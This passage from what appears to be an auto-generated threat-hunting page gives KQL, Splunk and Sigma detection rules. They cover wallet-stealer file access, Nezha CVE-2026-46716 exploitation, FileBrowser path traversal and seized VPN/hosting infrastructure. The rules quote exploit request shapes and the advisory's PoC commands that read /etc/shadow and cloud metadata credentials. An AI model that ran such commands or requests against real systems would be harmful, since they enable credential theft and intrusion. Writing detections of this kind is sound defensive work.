        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Crypto-wallet file/keystore access by non-wallet process Actions on Objectives High
Stealers / wallet drainers read keystore.json, MetaMask, Exodus, Atomic, Phantom data.

Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Ethereum\keystore\", @"\Bitcoin\", @"\Exodus\", @"\Electrum\wallets\", @"\MetaMask\", @"\Phantom\", @"\Atomic\Local Storage\")
| where InitiatingProcessFileName !in~ ("MetaMask.exe","Exodus.exe","Atomic.exe","electrum.exe","Bitcoin.exe","Phantom.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Ethereum\keystore\", @"\Bitcoin\",
                                  @"\Exodus\", @"\Electrum\wallets\",
                                  @"\MetaMask\", @"\Phantom\",
                                  @"\Atomic\Local Storage\")
| where ActingProcessName !in~ ("MetaMask.exe","Exodus.exe","Atomic.exe",
                                  "electrum.exe","Bitcoin.exe","Phantom.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Crypto-Wallet Keystore Access by Non-Wallet Process
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d02
status: experimental
description: |
    Stealers / wallet drainers read keystore files from MetaMask,
    Exodus, Atomic, Phantom, Bitcoin, Electrum, Ethereum-cli wallets.
    Filtering out the legitimate wallet binaries leaves only attacker
    activity.
references:
    - https://attack.mitre.org/techniques/T1005/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1005
    - attack.collection
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Ethereum\keystore\'
            - '\Bitcoin\'
            - '\Exodus\'
            - '\Electrum\wallets\'
            - '\MetaMask\'
            - '\Phantom\'
            - '\Atomic\Local Storage\'
    filter_legit:
        Image|endswith:
            - '\MetaMask.exe'
            - '\Exodus.exe'
            - '\Atomic.exe'
            - '\electrum.exe'
            - '\Bitcoin.exe'
            - '\Phantom.exe'
    condition: selection_path and not filter_legit
falsepositives:
    - Backup software
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Ethereum\keystore\*"
        OR Filesystem.file_path="*\Bitcoin\wallet.dat"
        OR Filesystem.file_path="*\Exodus\exodus.wallet*"
        OR Filesystem.file_path="*\Electrum\wallets\*"
        OR Filesystem.file_path="*\MetaMask\*"
        OR Filesystem.file_path="*\Phantom\*"
        OR Filesystem.file_path="*\Atomic\Local Storage\*")
      AND NOT Filesystem.process_name IN ("MetaMask.exe","Exodus.exe","Atomic.exe","electrum.exe","Bitcoin.exe","Phantom.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Ethereum\keystore\*"
        OR Filesystem.file_path="*\Bitcoin\wallet.dat"
        OR Filesystem.file_path="*\Exodus\exodus.wallet*"
        OR Filesystem.file_path="*\Electrum\wallets\*"
        OR Filesystem.file_path="*\MetaMask\*"
        OR Filesystem.file_path="*\Phantom\*"
        OR Filesystem.file_path="*\Atomic\Local Storage\*")
      AND NOT Filesystem.process_name IN ("MetaMask.exe","Exodus.exe","Atomic.exe","electrum.exe","Bitcoin.exe","Phantom.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
Article-specific behavioural hunt — Supply Chain Attack Targets Laravel-Lang Packages with Credential Stealer Exploitation High
Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.
ATT&CKT1204.002
Data sourcesEndpoint.Processes Endpoint.Filesystem Endpoint.Registry
// Article-specific bespoke detection — Supply Chain Attack Targets Laravel-Lang Packages with Credential Stealer
// Hunts the actual binaries / paths / commandline fragments named
// in the article instead of a generic technique-class template.
DeviceProcessEvents
| where Timestamp > ago(30d)

[LLM] Nezha CVE-2026-46716 exploit: POST /api/v1/cron with empty servers + CronCoverAll Exploitation High
Detects the exploit signature for Nezha Monitoring CVE-2026-46716 where a RoleMember submits a cron task with `cover=1` (CronCoverAll) and `servers=[]` to trigger the vacuous-true permission bypass in createCron. Targets the dashboard's web tier via reverse-proxy / WAF / IIS / App Service logs that capture POST bodies or at least the URI. Rationale: Targets the exact URI named in the GHSA advisory (`POST /api/v1/cron` gated by commonHandler not adminHandler) and the body shape that triggers the vacuous-true bypass (`servers=[]` + `cover=1`). The endpoint is rare under normal operation — admins create cron tasks occasionally, so even the URI alone is a strong pivot; body inspection (when WAF/proxy logs include it) elevates to deterministic. Cross-checked against: • https://github.com/advisories/GHSA-99gv-2m7h-3hh9 • https://github.com/nezhahq/nezha • https://nezha.wiki/en_US/
ATT&CKT1190 T1078 T1068
Data sourcesWeb.Web
// Primary: WAF / proxy logs that capture request body in DeviceCustomString or RequestContext
let ExploitBodyPattern = @'(?is)"servers"\s*:\s*\[\s*\][^}]*"cover"\s*:\s*1|"cover"\s*:\s*1[^}]*"servers"\s*:\s*\[\s*\]';
union isfuzzy=true
(CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod == "POST"
| where RequestURL endswith "/api/v1/cron"
| extend Body = strcat(coalesce(DeviceCustomString1, ""), " ", coalesce(DeviceCustomString2, ""), " ", coalesce(DeviceCustomString3, ""), " ", coalesce(RequestContext, ""), " ", coalesce(Message, ""))
| where Body matches regex ExploitBodyPattern or RequestURL has "cover=1"
| project TimeGenerated, SrcIP=SourceIP, Dst=DestinationHostName, RequestURL, RequestMethod, Body, RequestClientApplication, SourceUserName),
(W3CIISLog
| where TimeGenerated > ago(7d)
| where csMethod == "POST"
| where csUriStem endswith "/api/v1/cron"
| where scStatus >= 200 and scStatus < 300
| project TimeGenerated, SrcIP=cIP, Dst=Computer, csUriStem, csUriQuery, csUserName, csUserAgent, scStatus),
(AppServiceHTTPLogs
| where TimeGenerated > ago(7d)
| where CsMethod == "POST"
| where CsUriStem endswith "/api/v1/cron"
| where ScStatus >= 200 and ScStatus < 300
| project TimeGenerated, SrcIP=CIp, Dst=CsHost, CsUriStem, CsUriQuery, CsUsername, UserAgent, ScStatus)
| order by TimeGenerated desc

[LLM] nezha-agent spawning credential-access shell commands on Linux (post-RCE) Actions on Objectives High
Detects the post-exploitation footprint of Nezha CVE-2026-46716 on victim hosts: the nezha-agent process (typically running as root) executes a shell child that reads /etc/shadow or curls the cloud instance-metadata endpoint — exactly the PoC payload in the advisory. Targets Linux EDR / auditd process telemetry. Rationale: Pins on the named binary `nezha-agent` (the gRPC TaskStream sink that runs `cr.Command` per `service/singleton/crontask.go:133-181`) as parent, combined with the exact recon-string set from the advisory's PoC (`cat /etc/shadow`, `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`). Nezha-agent is a passive monitoring agent — these strings under its process tree are inherently malicious. Cross-checked against: • https://github.com/advisories/GHSA-99gv-2m7h-3hh9 • https://github.com/nezhahq/nezha • https://www.infosecurity-magazine.com/news/nezha-abused-post-exploitation/ • https://attack.mitre.org/techniques/T1552/005/ • https://attack.mitre.org/techniques/T1003/008/
ATT&CKT1059.004 T1003.008 T1552.005 T1057
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName has "nezha-agent"
   or InitiatingProcessParentFileName has "nezha-agent"
| where FileName in~ ("cat","less","more","head","tail","awk","sed","grep","curl","wget","sh","bash","dash","python","python3","perl")
| where ProcessCommandLine has_any (
    "/etc/shadow",
    "169.254.169.254",
    "iam/security-credentials",
    "metadata.google.internal",
    "metadata.azure.com",
    "/computeMetadata/v1",
    "/latest/meta-data"
  )
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          GrandparentImage = InitiatingProcessParentFileName,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
// Linux via ASIM (Defender for Endpoint Linux / Sysmon-Linux / auditd via ASIM parsers)
ImProcessCreate
| where TimeGenerated > ago(7d)
| where DvcOs has "Linux" or ActingProcessName has "nezha-agent" or ParentProcessName has "nezha-agent"
| where ParentProcessName has "nezha-agent"
    or ActingProcessName has "nezha-agent"
    or ParentProcessCommandLine has "nezha-agent"
| where TargetProcessCommandLine has_any (
    "/etc/shadow",
    "169.254.169.254",
    "iam/security-credentials",
    "metadata.google.internal",
    "metadata.azure.com",
    "/computeMetadata/v1",
    "/latest/meta-data"
  )
   or ActingProcessCommandLine has_any (
    "/etc/shadow",
    "169.254.169.254",
    "iam/security-credentials"
  )
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentProcessName, ParentProcessCommandLine,
          ActingProcessName, ActingProcessCommandLine,
          TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

[LLM] nezha-agent outbound network connection to cloud instance-metadata service Actions on Objectives High
Detects a network connection from any process under the nezha-agent process tree to the cloud instance-metadata endpoint (169.254.169.254 / metadata.google.internal / metadata.azure.com). This is the cleanest post-RCE signal for Nezha CVE-2026-46716 because nezha-agent has no legitimate reason to query IMDS — its monitoring telemetry goes to the dashboard's gRPC endpoint, not the cloud metadata API. Rationale: Targets the IMDS endpoint named verbatim in the advisory's PoC (`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`) and pins the source to nezha-agent's process tree. Nezha agents communicate with their dashboard over gRPC — they have zero legitimate reason to touch IMDS, making this a near-deterministic post-exploit signal. Distinct pivot from UC2 (network telemetry vs. process telemetry — catches cases where the EXECVE was missed but the connection was logged). Cross-checked against: • https://github.com/advisories/GHSA-99gv-2m7h-3hh9 • https://attack.mitre.org/techniques/T1552/005/ • https://github.com/nezhahq/nezha
ATT&CKT1552.005 T1071.001
Data sourcesNetwork_Traffic.All_Traffic Endpoint.Processes
// Two-stage: find IMDS connections, then filter to those whose initiating process chain includes nezha-agent
let ImdsHits = DeviceNetworkEvents
    | where Timestamp > ago(7d)
    | where RemoteIP == "169.254.169.254"
       or RemoteUrl has_any ("169.254.169.254", "metadata.google.internal", "metadata.azure.com")
    | project Timestamp, DeviceId, DeviceName, RemoteIP, RemoteUrl, RemotePort,
              InitiatingProcessId, InitiatingProcessFileName,
              InitiatingProcessParentFileName, InitiatingProcessCommandLine,
              InitiatingProcessAccountName;
ImdsHits
| where InitiatingProcessFileName has "nezha-agent"
   or InitiatingProcessParentFileName has "nezha-agent"
   or InitiatingProcessCommandLine has "nezha-agent"
// Catch grandparent chain via process-tree lookup
| union (
    ImdsHits
    | join kind=inner (
        DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessFileName has "nezha-agent"
        | project DeviceId, ChildPid=ProcessId, ChildFile=FileName, ChildCmd=ProcessCommandLine, ChildTime=Timestamp
    ) on DeviceId
    | where InitiatingProcessId == ChildPid and Timestamp between (ChildTime .. ChildTime + 10m)
  )
| order by Timestamp desc
// Network connection to IMDS where the originating process chain involves nezha-agent
let ImdsConn = ImNetworkSession
    | where TimeGenerated > ago(7d)
    | where DstIpAddr == "169.254.169.254"
       or DstHostname has_any ("metadata.google.internal", "metadata.azure.com");
let NezhaProcs = ImProcessCreate
    | where TimeGenerated > ago(7d)
    | where ActingProcessName has "nezha-agent"
       or ParentProcessName has "nezha-agent"
       or ParentProcessCommandLine has "nezha-agent"
    | project DvcHostname, NezhaProcPid=TargetProcessId, NezhaTime=TimeGenerated, NezhaCmd=TargetProcessCommandLine;
ImdsConn
| join kind=inner NezhaProcs on DvcHostname
| where TimeGenerated between (NezhaTime .. NezhaTime + 10m)
| project TimeGenerated, DvcHostname, SrcIpAddr, DstIpAddr, DstHostname, DstPortNumber, NezhaCmd, NezhaTime
| order by TimeGenerated desc

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46716")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.

The Hacker News
2026-05-22 7 use cases 3 techniques 6 kill-chain phases detected

Authorities in Europe and North America have announced the dismantling of a criminal virtual private network (VPN) service used by criminal actors to obscure the origins of ransomware attacks, data theft, scanning, and denial-of-service attacks. Codenamed Operation Saffron, the disruption of First VPN Service was led by France and the Netherlands, with several other nations supporting the

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → [LLM] Endpoint visits to Russian-speaking cybercrime forums Exploit.in / XSS.is
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Outbound connections to seized First VPN exit node IPs · [LLM] Endpoint resolution or web traffic to seized 1vpns[.]com/net/org domains · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
[LLM] Outbound connections to seized First VPN exit node IPs Command & Control High
Detects internal endpoints or perimeter devices initiating connections to the three U.S.-located First VPN exit-node IPs published by the FBI flash alert (2.223.66.103, 5.181.234.59, 92.38.148.58). Hits indicate prior use of the takedown-targeted criminal VPN — either by a malicious insider, a compromised host beaconing back through the old infrastructure, or law-enforcement sinkhole traffic worth triaging. Rationale: Uses the three exact U.S. exit-node IPs (2.223.66.103, 5.181.234.59, 92.38.148.58) named in the FBI flash alert quoted in the article. Static IPs published by law enforcement post-seizure are high-fidelity IOCs with effectively zero legitimate enterprise use. Cross-checked against: • https://www.europol.europa.eu/media-press/newsroom • https://www.ic3.gov/
ATT&CKT1090.003 T1572
Data sourcesNetwork_Traffic.All_Traffic
let exitNodes = dynamic(["2.223.66.103","5.181.234.59","92.38.148.58"]);
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in (exitNodes)
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, Protocol, RemoteUrl
| order by Timestamp desc
let exitNodes = dynamic(["2.223.66.103","5.181.234.59","92.38.148.58"]);
union isfuzzy=true
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationIP in (exitNodes)
    | project TimeGenerated, Host=SourceHostName, SourceIP, DestinationIP, DestinationPort, ApplicationProtocol, DeviceVendor, DeviceProduct),
  (ImNetworkSession
    | where TimeGenerated > ago(30d)
    | where DstIpAddr in (exitNodes)
    | project TimeGenerated, Host=SrcHostname, SourceIP=SrcIpAddr, DestinationIP=DstIpAddr, DestinationPort=DstPortNumber, ApplicationProtocol=NetworkApplicationProtocol, DeviceVendor=EventVendor, DeviceProduct=EventProduct)
| order by TimeGenerated desc

[LLM] Endpoint resolution or web traffic to seized 1vpns[.]com/net/org domains Command & Control High
Catches any internal host that resolves or browses to the three seized First VPN domains (1vpns.com / 1vpns.net / 1vpns.org). Post-takedown, any contact is either a forensic indicator of prior use, malware with stale C2/proxy config still beaconing, or an insider continuing to attempt access to the criminal service. Rationale: The three domains (1vpns.com, 1vpns.net, 1vpns.org) are quoted directly from the Eurojust seizure list in the article. Post-seizure these resolve to sinkholes or NX — any traffic from a corporate host is a confirmed historical-use signal worth alerting on. Cross-checked against: • https://www.eurojust.europa.eu/news • https://www.europol.europa.eu/media-press/newsroom
ATT&CKT1071.001 T1090.003

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT

| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m

[LLM] FileBrowser Quantum public share PATCH path traversal in fromPath/toPath (GHSA-qqqm-5547-774x) Exploitation High
Detects exploitation of the unauthenticated path traversal in FileBrowser Quantum's publicPatchHandler. Targets HTTP PATCH requests to /public/api/resources?hash=<share-hash> whose JSON body contains '..' segments in the fromPath or toPath fields — the exact pattern that escapes the share root before SanitizeUserPath runs. Rationale: Pivots on the verbatim exploit-request shape from the advisory: HTTP PATCH against /public/api/resources with hash= query string, where the JSON body contains a fromPath or toPath value beginning with '..'. Confirmed against the GitLab Advisories writeup of the sibling CVE-2026-44542 (same handler family, same root-cause sanitize-after-join pattern). Defender/Falcon left empty because EDR telemetry does not include HTTP request bodies — this is exclusively a WAF/web-proxy detection. Cross-checked: https://advisories.gitlab.com/golang/github.com/gtsteffaniak/filebrowser/CVE-2026-44542/, https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673, https://nvd.nist.gov/vuln/detail/CVE-2026-44542, https://deepwiki.com/gtsteffaniak/filebrowser/2.3-api-design. Cross-checked against: • https://advisories.gitlab.com/golang/github.com/gtsteffaniak/filebrowser/CVE-2026-44542/ • https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673 • https://nvd.nist.gov/vuln/detail/CVE-2026-44542 • https://deepwiki.com/gtsteffaniak/filebrowser/2.3-api-design
ATT&CKT1190 T1083
Data sourcesWeb.All_Web
let endpoint = "/public/api/resources";
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL contains endpoint
| where RequestURL contains "hash="
| extend BodySource = coalesce(tostring(DeviceCustomString1), tostring(DeviceCustomString2), tostring(DeviceCustomString3), tostring(DeviceCustomString4), tostring(DeviceCustomString5), tostring(DeviceCustomString6), tostring(RequestContext), tostring(Message))
| where BodySource matches regex @"(?i)""(from|to)Path""\s*:\s*""[^""]*\.\."
| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, SourceUserName, RequestClientApplication, RequestMethod, RequestURL, EventOutcome, BodySource, DeviceAction
| order by TimeGenerated desc

[LLM] Volumetric PATCH probing against FileBrowser Quantum public share endpoint Reconnaissance Medium
Catches automated path-traversal probing where one source IP issues many PATCH requests with varying body shapes against /public/api/resources?hash=<hash> in a short window. Targets attacker tooling enumerating share hashes or fuzzing fromPath/toPath values for the GHSA-qqqm-5547-774x bug — distinct from a single legitimate rename operation. Rationale: A single legitimate user renaming a file via a public share generates one PATCH; an attacker fuzzing fromPath/toPath payloads or enumerating share hashes generates many in a tight window. Threshold pivots: ≥10 PATCHes from one IP in 5 min, OR ≥3 distinct hash= values from one IP in 5 min. Datadog query is the raw filter — the count/groupBy threshold is set at rule level per the Datadog Cloud SIEM model. Defender/Falcon empty because HTTP telemetry isn't on the EDR. Cross-checked: https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673, https://github.com/gtsteffaniak/filebrowser/releases. Cross-checked against: • https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673 • https://github.com/gtsteffaniak/filebrowser/releases • https://deepwiki.com/gtsteffaniak/filebrowser/2.3-api-design
ATT&CKT1190 T1595.002
Data sourcesWeb.All_Web
let WindowMin = 5m;
let PatchThreshold = 10;
let HashThreshold = 3;
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL contains "/public/api/resources"
| extend ShareHash = extract(@"(?i)[?&]hash=([A-Za-z0-9_-]+)", 1, RequestURL)
| summarize PatchCount = count(),
            UniqueHashes = dcount(ShareHash),
            FirstSeen = min(TimeGenerated),
            LastSeen = max(TimeGenerated),
            UserAgents = make_set(RequestClientApplication, 25),
            StatusCodes = make_set(EventOutcome, 25)
            by SourceIP, DeviceVendor, DeviceProduct, bin(TimeGenerated, WindowMin)
| where PatchCount >= PatchThreshold or UniqueHashes >= HashThreshold
| extend ProbeSignal = case(UniqueHashes >= HashThreshold and PatchCount >= PatchThreshold, "hash_enumeration",
                            PatchCount >= 20, "single_hash_fuzzing",
                            "elevated")
| order by PatchCount desc
source:(nginx OR caddy OR apache OR aws.waf OR cloudflare OR azure.appgw) @http.method:PATCH @http.url:*\/public\/api\/resources*
WEB
Toggle if your env has no CIM data-model acceleration.

| tstats summariesonly=false count as patch_count, dc(Web.uri_query) as unique_hashes, dc(Web.url) as unique_urls, values(Web.http_user_agent) as user_agents, values(Web.status) as status_codes, min(_time) as firstTime, max(_time) as lastTime from datamodel=Web where Web.http_method="PATCH" AND Web.url="*/public/api/resources*" by Web.src, Web.dest, span=5m | `drop_dm_object_name("Web")` | where patch_count >= 10 OR unique_hashes >= 3 | eval probe_signal=if(unique_hashes>=3 AND patch_count>=10, "hash_enumeration", if(patch_count>=20, "single_hash_fuzzing", "elevated")) | table firstTime, lastTime, src, dest, patch_count, unique_hashes, unique_urls, user_agents, status_codes, probe_signal | sort - patch_count

Hunts host or proxy egress to domains operated by the Stark Industries / THE.Hosting / PQ-Hosting / Mirhosting ecosystem seized by Dutch FIOD on 22 May 2026. These domains were colocation/transit for NoName057(16) DDoS C2 and Russian state-aligned influence/disinformation operations, so any client-side hit is high-fidelity malware/C2 signal post-takedown. Rationale: Domains stark-industries.solutions, the.hosting, worktitans.nl, pq.hosting, ufo.hosting, bill-migration-db.stark-industries.solutions, pq-ru.digitalvpn.org and pq.company are explicitly named in the BleepingComputer article and corroborated by the FIOD press release and the De Volkskrant report; PQ-Hosting / Stark / WorkTitans/THE.Hosting are also tracked in Team Cymru, Recorded Future and Correctiv reporting as bulletproof transit for NoName057(16) and Doppelganger/RRN influence ops. Any client-side resolution post-seizure indicates either a compromised host beaconing, residual influence-op tooling, or an analyst pivoting — all worth triage. Cross-checked against: • https://www.fiod.nl/ • https://www.volkskrant.nl/ • https://www.team-cymru.com/post/stark-industries-solutions-an-iron-hammer-in-the-cloud • https://www.recordedfuture.com/research/the-russia-aligned-network-of-influence-operations-doppelganger • https://attack.mitre.org/groups/G1024/
ATT&CKT1071.001 T1583.003 T1090.003
Data sourcesNetwork_Traffic.All_Traffic Web.Web
let StarkDomains = dynamic(["stark-industries.solutions","the.hosting","worktitans.nl","pq.hosting","ufo.hosting","bill-migration-db.stark-industries.solutions","pq-ru.digitalvpn.org","pq.company"]);
let StarkSuffixes = dynamic([".stark-industries.solutions",".the.hosting",".worktitans.nl",".pq.hosting",".ufo.hosting"]);
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where isnotempty(RemoteUrl)
| extend HostLower = tolower(RemoteUrl)
| where HostLower in (StarkDomains) or HostLower has_any (StarkSuffixes)
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Hits=count(), Procs=make_set(InitiatingProcessFileName,10), Cmds=make_set(InitiatingProcessCommandLine,10), RemoteIPs=make_set(RemoteIP,10) by DeviceName, DeviceId, InitiatingProcessAccountName, HostLower
| order by FirstSeen asc
let StarkDomains = dynamic(["stark-industries.solutions","the.hosting","worktitans.nl","pq.hosting","ufo.hosting","bill-migration-db.stark-industries.solutions","pq-ru.digitalvpn.org","pq.company"]);
let StarkSuffixes = dynamic([".stark-industries.solutions",".the.hosting",".worktitans.nl",".pq.hosting",".ufo.hosting"]);
let FromDns = (union isfuzzy=true
    (DnsEvents
        | where TimeGenerated > ago(7d)
        | extend HostLower = tolower(Name)
        | where HostLower in (StarkDomains) or HostLower has_any (StarkSuffixes)
        | project TimeGenerated, Host = Computer, ClientIP, HostLower, Source = "DnsEvents"),
    (ImDnsActivity
        | where TimeGenerated > ago(7d)
        | extend HostLower = tolower(DnsQuery)
        | where HostLower in (StarkDomains) or HostLower has_any (StarkSuffixes)
        | project TimeGenerated, Host = coalesce(SrcHostname, DvcHostname), ClientIP = SrcIpAddr, HostLower, Source = "ImDnsActivity"));
let FromProxy = CommonSecurityLog
    | where TimeGenerated > ago(7d)
    | extend HostLower = tolower(coalesce(RequestURL, DestinationHostName, DestinationDnsDomain))
    | where HostLower in (StarkDomains) or HostLower has_any (StarkSuffixes)
    | project TimeGenerated, Host = SourceHostName, ClientIP = SourceIP, HostLower, Source = strcat(DeviceVendor,":",DeviceProduct));
union FromDns, FromProxy
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), Hits=count(), Sources=make_set(Source,5) by Host, ClientIP, HostLower
| order by FirstSeen asc

[LLM] NoName057(16) DDoSia client beaconing to Stark / PQ-Hosting C2 ranges Command & Control Medium
